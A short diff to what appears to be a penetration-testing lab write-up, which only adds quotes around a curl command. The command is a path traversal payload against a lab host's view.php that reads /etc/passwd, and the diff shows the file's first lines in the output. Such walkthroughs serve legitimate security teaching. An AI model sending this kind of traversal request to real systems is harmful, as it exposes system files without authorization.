@@ -91,7 +91,7 @@ If vulnerable, this should display the contents of the `/etc/passwd` file, which
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ curl http://192.168.56.106/view.php?page=../../../../../etc/passwd
+└─$ curl "http://192.168.56.106/view.php?page=../../../../../etc/passwd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
